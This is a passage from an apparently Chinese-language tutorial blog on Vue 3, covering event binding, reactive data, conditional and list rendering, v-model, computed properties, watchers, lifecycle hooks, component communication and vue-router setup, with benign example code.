<li><strong>v-on:事件名称</strong>  可以简写成  <strong>@事件名</strong></li>
<li>原生JS中事件名是 on*** 形式的，在vue中事件名需要去掉 on</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">function fun()&#123;</span><br><span class="line">  alert(&quot;person.age is &quot;+person.age)</span><br><span class="line">&#125;</span><br><span class="line">let person=&#123;</span><br><span class="line">  age:10,</span><br><span class="line">  name:&quot;li&quot;</span><br><span class="line">&#125;</span><br><span class="line">function desc()&#123;</span><br><span class="line">  person.age--</span><br><span class="line">  alert(&quot;person.age is &quot;+person.age)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;!-- 原生JS中事件名是 on*** 形式的，在vue中事件名需要去掉 on --&gt;</span><br><span class="line">  &lt;button v-on:click=&quot;fun()&quot;&gt;hello&lt;/button&gt;</span><br><span class="line">  &lt;!-- 内联事件处理器：函数代码可以直接写在命令中 --&gt;</span><br><span class="line">  &lt;button v-on:click=&quot;person.age++&quot;&gt;grow&lt;/button&gt;</span><br><span class="line">  &lt;!-- 事件的修饰符：</span><br><span class="line">       .once 事件只绑定一次，无法再次触发 </span><br><span class="line">       .prevent 阻止组件默认行为</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;button v-on:click.once=&quot;desc()&quot;&gt;desc&lt;/button&gt;</span><br><span class="line">  &lt;a href=&quot;https://www.bilibili.com/&quot; v-on:click.prevent=&quot;fun2()&quot;&gt;bilibili&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="响应式数据处理"><a href="#响应式数据处理" class="headerlink" title="响应式数据处理"></a>响应式数据处理</h4><p><em>让普通数据转为响应式数据的两种方式</em></p>
<ul>
<li><code>ref</code> 函数：适合单个变量<ul>
<li>在<code>script</code>标签中操作ref响应式数据需要<code>.value</code></li>
<li>在<code>template</code>标签中操作ref响应式数据无需.value</li>
</ul>
</li>
<li><code>reactive</code> 函数：适合对象<ul>
<li>在<code>script</code>和<code>template</code>标签中操作reactive响应式数据都直接使用<code>对象名.属性名</code>的方式</li>
</ul>
</li>
</ul>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref,reactive,toRef,toRefs &#125; from &quot;vue&quot;</span><br><span class="line">  let num = ref(0)</span><br><span class="line">  function incrNum()&#123;</span><br><span class="line">    num.value++</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name: &#x27;li&#x27;,</span><br><span class="line">    age:10</span><br><span class="line">  &#125;)</span><br><span class="line">  function addAge()&#123;</span><br><span class="line">    person.age++</span><br><span class="line">  &#125;</span><br><span class="line">  function show()&#123;</span><br><span class="line">    alert(&quot;person&quot;+person.age+&quot;num&quot;+num.value)</span><br><span class="line">  &#125;</span><br><span class="line">  // toRef 函数：将reactive响应式数据中的某个属性转为ref响应式数据</span><br><span class="line">  // toRefs 函数：同时将reactive响应式数据中的多个属性转为ref响应式数据</span><br><span class="line">  let pAge = toRef(person,&#x27;age&#x27;)    // pAge变化原来的person.age也变化，是同一个</span><br><span class="line">  let&#123;name,age&#125; = toRefs(person)    // 参数必须与属性名相同</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;button @click=&quot;incrNum()&quot;&gt;+&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;num++&quot;&gt;+&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;addAge()&quot;&gt;+&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;person.age++&quot;&gt;+&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;show()&quot;&gt;显示&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="条件渲染命令"><a href="#条件渲染命令" class="headerlink" title="条件渲染命令"></a>条件渲染命令</h4><p>命令如下：</p>
<ul>
<li><code>v-if</code>：命令中条件为真，渲染当前标签内容；为假，不渲染当前标签内容，元素不在DOM树中。条件较少改变建议使用。</li>
<li><code>v-else</code> ：自动和前一个<code>v-if</code>做取反操作，前一个<code>v-if</code>为真，不渲染当前标签内容；为假，渲染当前标签内容</li>
<li><code>v-show</code>：命令中条件为真，显示当前标签内容；为假，隐藏当前标签内容。<strong>通过调整CSS样式实现，不展示时在DOM树中仍然存在。</strong>频繁切换建议使用。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">  let flag = ref(true)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;h1 v-if=&quot;flag&quot;&gt; vue is awesome&lt;/h1&gt;</span><br><span class="line">  &lt;h1 v-else&gt; vue is no awesome&lt;/h1&gt;</span><br><span class="line">  &lt;h1 v-show=&quot;!flag&quot;&gt; hahahaha &lt;/h1&gt;</span><br><span class="line">  &lt;button @click=&quot;flag = !flag&quot;&gt;change&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="列表渲染命令"><a href="#列表渲染命令" class="headerlink" title="列表渲染命令"></a>列表渲染命令</h4><p>主要使用<code>v-for</code>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line"> let msgs = reactive([</span><br><span class="line">  &#123;</span><br><span class="line">  id:&quot;msg1&quot;,</span><br><span class="line">  message:&quot;message1&quot;</span><br><span class="line"> &#125;,&#123;</span><br><span class="line">  id:&quot;msg2&quot;,</span><br><span class="line">  message:&quot;message2&quot;</span><br><span class="line"> &#125;,&#123;</span><br><span class="line">  id:&quot;msg3&quot;,</span><br><span class="line">  message:&quot;message3&quot;</span><br><span class="line"> &#125;</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;!-- 没有key属性会警告,每个Li都需要唯一的key,因此常用id值 --&gt;</span><br><span class="line">    &lt;li v-for=&quot;msg in msgs&quot; :key=&quot;msg.id&quot;&gt; </span><br><span class="line">      &#123;&#123; msg.message &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">  &lt;!-- 可以获取顺序 --&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;(msg,index) in msgs&quot; :key=&quot;msg.id&quot;&gt;  </span><br><span class="line">      &#123;&#123;index&#125;&#125; &#123;&#123; msg.message &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



<h4 id="双向绑定命令"><a href="#双向绑定命令" class="headerlink" title="双向绑定命令"></a>双向绑定命令</h4><p>单向绑定：</p>
<ul>
<li>响应式数据发生变化时，更新DOM树</li>
<li>用户操作如果造成页面内容的改变时，不会影响响应式数据</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">let msg = ref(&#x27;zhangsan&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;!-- 用户在文本框中输入的内容不会改变msg，也不会改变msg显示的信息 --&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; :value=&quot;msg&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &#123;&#123; msg &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<p>双向绑定：<strong>一般用于表单标签</strong></p>
<ul>
<li>响应式数据发生变化时，更新DOM树</li>
<li>用户操作如果造成页面中数据的改变时，会同步修改对应的响应式数据</li>
<li>语法：<code>v-model:value=&quot;数据&quot;</code>，现<strong>必须省略</strong><code>:value</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; reactive, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">let msg = ref(&#x27;zhangsan&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; v-model=&quot;msg&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &#123;&#123; msg &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<p><code>v-model</code>命令在不同标签的使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; reactive, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">let user = reactive(&#123;</span><br><span class="line">  userName:&quot;&quot;,</span><br><span class="line">  userPwd:&quot;&quot;,</span><br><span class="line">  info:&quot;&quot;,</span><br><span class="line">  pos:&quot;&quot;</span><br><span class="line">&#125;)</span><br><span class="line">let hbs = ref([])</span><br><span class="line"></span><br><span class="line">function clearForm()&#123;</span><br><span class="line">  user.userName=&quot;&quot;</span><br><span class="line">  user.info=&quot;&quot;</span><br><span class="line">  user.userPwd=&quot;&quot;</span><br><span class="line">  user.pos=&quot;&quot;</span><br><span class="line">  // 响应式数据清空不能直接指向新的地址（hbs = ref([])），必须使用API</span><br><span class="line">  hbs.value.splice(0,hbs.value.length)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;!-- 普通输入框的使用 --&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; v-model=&quot;user.userName&quot;&gt; &lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;password&quot; v-model=&quot;user.userPwd&quot;&gt; </span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  爱好：</span><br><span class="line">  &lt;!-- 多选框需要额外指定value,value需不同--&gt;</span><br><span class="line">  &lt;!-- 单选框需要额外指定name，name需相同 --&gt;</span><br><span class="line">  唱  &lt;input type=&quot;checkbox&quot; v-model=&quot;hbs&quot; value=&quot;sing&quot;&gt;</span><br><span class="line">  跳  &lt;input type=&quot;checkbox&quot; v-model=&quot;hbs&quot; value=&quot;dance&quot;&gt;</span><br><span class="line">  rap &lt;input type=&quot;checkbox&quot; v-model=&quot;hbs&quot; value=&quot;rap&quot;&gt;</span><br><span class="line">  &lt;br&gt; </span><br><span class="line">  &lt;!-- 在文本框的使用 --&gt;</span><br><span class="line">  简介：&lt;textarea v-model=&quot;user.info&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;!-- 在选择框的使用 --&gt;</span><br><span class="line">  &lt;select v-model=&quot;user.pos&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;北京&quot;&gt;北京&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;上海&quot;&gt;上海&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;广州&quot;&gt;广州&lt;/option&gt;    </span><br><span class="line">  &lt;/select&gt;</span><br><span class="line">  &lt;button @click=&quot;clearForm()&quot;&gt;清空&lt;/button&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &#123;&#123; user &#125;&#125;</span><br><span class="line">  &#123;&#123; hbs &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>





<h3 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h3><p>通过方法返回数据 VS 通过计算属性获得数据</p>
<ul>
<li>前者每使用一次执行一次</li>
<li>后者每次使用时，如果和上一次使用时数据没有变化，则直接使用上一次的结果</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">import &#123; computed, reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">const author = reactive(&#123;</span><br><span class="line">  name:&quot;张三&quot;,</span><br><span class="line">  books:[&quot;javascript&quot;,&quot;java&quot;,&quot;mysql&quot;]</span><br><span class="line">&#125;)</span><br><span class="line">let booksMessage = computed(()=&gt;&#123;</span><br><span class="line">  return author.books.length&gt;0 ? &quot;是&quot;:&quot;否&quot; </span><br><span class="line">&#125;)</span><br><span class="line">function hasBooks()&#123;</span><br><span class="line">  return author.books.length&gt;0 ? &quot;是&quot;:&quot;否&quot; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;p&gt;作者：&#123;&#123; author.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;!-- 执行三次 --&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; hasBooks() &#125;&#125;&lt;br&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; hasBooks() &#125;&#125;&lt;br&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; hasBooks() &#125;&#125;&lt;br&gt;</span><br><span class="line">  &lt;!-- 执行一次，适合大量属性计算 --&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; booksMessage &#125;&#125;&lt;br&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; booksMessage &#125;&#125;&lt;br&gt;</span><br><span class="line">  是否出版过图书：&#123;&#123; booksMessage &#125;&#125;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h3 id="数据监听器"><a href="#数据监听器" class="headerlink" title="数据监听器"></a>数据监听器</h3><p>当数据发生改变，需要执行一些代码时，我们可以使用数据监听器：<code>watch</code>或<code>watchEffect</code>函数</p>
<p><code>watch</code>函数的使用场景：</p>
<ul>
<li>当数据发生变化时需要执行相应操作</li>
<li>监听数据变化，当满足一定条件时触发相应操作</li>
<li>在异步操作前后需要执行相应操作</li>
</ul>
<p><code>watchEffect</code>函数的使用：函数<strong>内部涉及的所有响应式数据中的任何一个发生变化</strong>都会触发函数的执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">import &#123; ref,reactive, watch, watchEffect &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">let fullName = ref(&quot;&quot;)</span><br><span class="line">let firstName = ref(&quot;&quot;)</span><br><span class="line">let lastName = reactive(&#123;</span><br><span class="line">  name:&quot;&quot;</span><br><span class="line">&#125;)</span><br><span class="line">// watch 监听 ref 响应式数据 需要一个响应式数据参数和一个函数参数</span><br><span class="line">watch(firstName,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  console.log(`$&#123;oldValue&#125;变为$&#123;newValue&#125;`);</span><br><span class="line">  fullName.value = newValue+lastName.name</span><br><span class="line">&#125;)</span><br><span class="line">// watch 监听 reactive 响应式数据的 一个属性 需要两个函数参数</span><br><span class="line">watch(()=&gt;&#123;return lastName.name&#125;,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  console.log(`$&#123;oldValue&#125;变为$&#123;newValue&#125;`);</span><br><span class="line">  fullName.value = firstName.value+newValue</span><br><span class="line">&#125;)</span><br><span class="line">// watch 监听 reactive 响应式数据的 全部属性 需要添加,&#123;deep:true&#125;参数</span><br><span class="line">watch(()=&gt;lastName,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  // 此时newValue,oldValue都是lastName</span><br><span class="line">  fullName.value = firstName.value+lastName.name</span><br><span class="line">&#125;,&#123;deep:true&#125;)</span><br><span class="line">// watch监听只有在发生变化时才会执行，如果想要页面加载完成立即执行，</span><br><span class="line">// 则需要参数&#123;immediate:true&#125;，此参数应当与deep:true在同一个&#123;&#125;中，写成&#123;deep:true,immediate:true&#125;</span><br><span class="line"></span><br><span class="line">// watchEffect </span><br><span class="line">// 函数内部涉及的所有响应式数据中的任何一个发生变化都会触发！</span><br><span class="line">watchEffect(()=&gt;&#123;</span><br><span class="line">  fullName.value = firstName.value+lastName.name</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br&gt;</span><br><span class="line">  名：&lt;input type=&quot;text&quot; v-model=&quot;lastName.name&quot;&gt; &lt;br&gt;</span><br><span class="line">  全名：&#123;&#123; fullName &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>





<h3 id="Vue的生命周期和钩子函数"><a href="#Vue的生命周期和钩子函数" class="headerlink" title="Vue的生命周期和钩子函数"></a>Vue的生命周期和钩子函数</h3><p><img src="https://cn.vuejs.org/assets/lifecycle_zh-CN.W0MNXI0C.png" alt="生命周期"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/%E6%97%A0%E6%A0%87%E9%A2%98.png"></p>
<p>Vue 3 <strong>生命周期钩子及其作用</strong></p>
<table>
<thead>
<tr>
<th>钩子函数</th>
<th>触发时机</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><strong>onBeforeMount</strong></td>
<td>在组件挂载开始之前调用</td>
<td>可以在此时执行一些初始化操作，但不能进行 DOM 操作。</td>
</tr>
<tr>
<td><strong>onMounted</strong></td>
<td>在组件挂载到 DOM 后调用</td>
<td>可以访问和操作 DOM 元素，适合进行第三方库的初始化等操作。</td>
</tr>
<tr>
<td><strong>onBeforeUpdate</strong></td>
<td>在数据更新导致虚拟 DOM 重新渲染前调用</td>
<td>可以在此时访问现有的 DOM，例如手动移除已添加的事件监听器。</td>
</tr>
<tr>
<td><strong>onUpdated</strong></td>
<td>在数据更新导致虚拟 DOM 重新渲染后调用</td>
<td>可以在此时操作更新后的 DOM，但要注意避免无限循环更新。</td>
</tr>
<tr>
<td><strong>onBeforeUnmount</strong></td>
<td>在组件实例销毁之前调用（相当于 Vue 2 的 <code>beforeDestroy</code>）</td>
<td>可以在此时进行资源清理，如取消定时器、解绑全局事件等。</td>
</tr>
<tr>
<td><strong>onUnmounted</strong></td>
<td>在组件实例销毁之后调用（相当于 Vue 2 的 <code>destroyed</code>）</td>
<td>进行最终的清理工作，确保所有资源都被正确释放。</td>
</tr>
<tr>
<td><strong>onErrorCaptured</strong></td>
<td>当捕获到一个来自后代组件的错误时调用</td>
<td>可以在此时处理错误，例如记录日志或显示错误信息。</td>
</tr>
<tr>
<td><strong>onRenderTracked</strong></td>
<td>调试钩子，在虚拟 DOM 重新渲染过程中跟踪依赖时调用</td>
<td>主要用于调试目的，了解哪些依赖触发了重新渲染。</td>
</tr>
<tr>
<td><strong>onRenderTriggered</strong></td>
<td>调试钩子，在虚拟 DOM 重新渲染被触发时调用</td>
<td>主要用于调试目的，了解哪些因素触发了重新渲染。</td>
</tr>
</tbody></table>
<h3 id="组件与页面组件化"><a href="#组件与页面组件化" class="headerlink" title="组件与页面组件化"></a>组件与页面组件化</h3><p>在 Vue.js 中，组件是构建用户界面的基本单元。每个组件都可以看作是一个独立的功能模块，它有自己的模板、逻辑和样式。通过组合不同的组件，可以创建复杂的用户界面。</p>
<h4 id="1、组件拼接成页面"><a href="#1、组件拼接成页面" class="headerlink" title="1、组件拼接成页面"></a>1、组件拼接成页面</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  // 引入多个 vue 组件</span><br><span class="line">  import Header from&#x27;./components/Header.vue&#x27;</span><br><span class="line">  import Navigator from &#x27;./components/Navigator.vue&#x27;;</span><br><span class="line">  import Content from &#x27;./components/Content.vue&#x27;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">      &lt;Header class=&quot;header&quot;&gt;&lt;/Header&gt;</span><br><span class="line">      &lt;Navigator class=&quot;navigator&quot;&gt;&lt;/Navigator&gt;</span><br><span class="line">      &lt;Content class=&quot;content&quot;&gt;&lt;/Content&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="2、组件间传参"><a href="#2、组件间传参" class="headerlink" title="2、组件间传参"></a>2、组件间传参</h4><p>兄弟组件传参必须使用父组件作为中转</p>
<p><strong>父子组件参数传递：</strong></p>
<p>一、子传父：</p>
<ul>
<li>子组件：<code>const 常量名 = defineEmits([&quot;发送事件名&quot;])</code>+提交数据的函数，内部包含代码：<code>常量名(&quot;发送事件名&quot;,函数形参即发送的数据)</code></li>
<li>父组件：对应子组件标签中绑定子组件定义的发送事件和一个自定义接收函数，此接收函数的形参即为接收的数据</li>
</ul>
<p>二、父传子：</p>
<ul>
<li>父组件：对应子组件标签中自定义属性，属性值为需要发送的参数</li>
<li>子组件：<code>defineProps(&#123;上述自定义属性:参数类型&#125;)</code>，属性即传递的参数。</li>
</ul>
<p>Navigator.vue 子组件    发送数据到父组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">// 向父组件发送参数</span><br><span class="line">// defineEmits用于定义向父组件提交数据的事件以及正式的提交数据</span><br><span class="line">import &#123; defineEmits &#125; from &#x27;vue&#x27;;</span><br><span class="line">// 定义一个向父组件提交数据的事件，事件名称自定义，这里是sendMenu</span><br><span class="line">const emits = defineEmits([&quot;sendMenu&quot;])</span><br><span class="line">// 提交数据的方法</span><br><span class="line">function send(data)&#123;</span><br><span class="line">    emits(&quot;sendMenu&quot;,data)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li @click=&quot;send(&#x27;学生管理&#x27;)&quot;&gt;学生管理&lt;/li&gt;</span><br><span class="line">            &lt;li @click=&quot;send(&#x27;教师管理&#x27;)&quot;&gt;教师管理&lt;/li&gt;</span><br><span class="line">            &lt;li @click=&quot;send(&#x27;班级管理&#x27;)&quot;&gt;班级管理&lt;/li&gt;</span><br><span class="line">            &lt;li @click=&quot;send(&#x27;请假管理&#x27;)&quot;&gt;请假管理&lt;/li&gt;</span><br><span class="line">            &lt;li @click=&quot;send(&#x27;考试管理&#x27;)&quot;&gt;考试管理&lt;/li&gt;            </span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>APP.vue 父组件  接收子组件数据并发送到另一个子组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  // 引入多个 vue 组件</span><br><span class="line">  import Header from&#x27;./components/Header.vue&#x27;</span><br><span class="line">  import Navigator from &#x27;./components/Navigator.vue&#x27;;</span><br><span class="line">  import Content from &#x27;./components/Content.vue&#x27;;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">  let msg = ref(&quot;&quot;)</span><br><span class="line">  // 接收子组件传递的参数的函数，data即为传过来的参数</span><br><span class="line">  function receiver(data)&#123;</span><br><span class="line">    msg.value=data</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">      &lt;Header class=&quot;header&quot;&gt;&lt;/Header&gt;</span><br><span class="line">      &lt;!-- 接收子组件传递的参数，将事件和接收函数绑定 (v-on命令简写为@) --&gt;</span><br><span class="line">      &lt;Navigator class=&quot;navigator&quot; @sendMenu=&quot;receiver&quot;&gt;&lt;/Navigator&gt;</span><br><span class="line">      &lt;!-- 向子组件发送参数，使用自定义属性作为参数，值为需要发送的参数 --&gt;</span><br><span class="line">      &lt;Content class=&quot;content&quot; :fatherSend=&quot;msg&quot;&gt;&lt;/Content&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>Content.vue 子组件 接收父组件数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">    // 接收父组件的参数</span><br><span class="line">    import &#123; defineProps &#125; from &#x27;vue&#x27;;</span><br><span class="line">    defineProps(&#123;</span><br><span class="line">        fatherSend:String</span><br><span class="line">        // fatherSend是父组件定义的属性名，String是参数的类型，必须说明</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;这是内容&lt;/p&gt;</span><br><span class="line">    &#123;&#123; fatherSend &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="Vue路由（页面切换）机制"><a href="#Vue路由（页面切换）机制" class="headerlink" title="Vue路由（页面切换）机制"></a>Vue路由（页面切换）机制</h2><p>首先导入路由依赖：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install vue-router@4 --save // 下载版本4</span><br></pre></td></tr></table></figure>



<h3 id="使用简例"><a href="#使用简例" class="headerlink" title="使用简例"></a>使用简例</h3><h4 id="1、编写路由指导文件"><a href="#1、编写路由指导文件" class="headerlink" title="1、编写路由指导文件"></a>1、编写路由指导文件</h4><p>router.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 导入创建路由对象需要使用的函数 */</span></span><br><span class="line"><span class="keyword">import</span> &#123;createRouter,createWebHashHistory&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导入 .vue 组件 */</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Add</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Add.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">List</span> <span class="keyword">from</span> <span class="string">&#x27;../components/List.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Update</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Update.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个路由对象</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">    <span class="comment">// history 属性 用于记录路由的历史</span></span><br><span class="line">    <span class="attr">history</span>:<span class="title function_">createWebHashHistory</span>(),</span><br><span class="line">    <span class="comment">// routes 属性 用于定义多个不同 路径和组件之间的对应关系</span></span><br><span class="line">    <span class="attr">routes</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">			<span class="comment">// 设置默认为Home页</span></span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/home&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/list&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">List</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/add&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Add</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/update&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Update</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 向外暴露router</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>



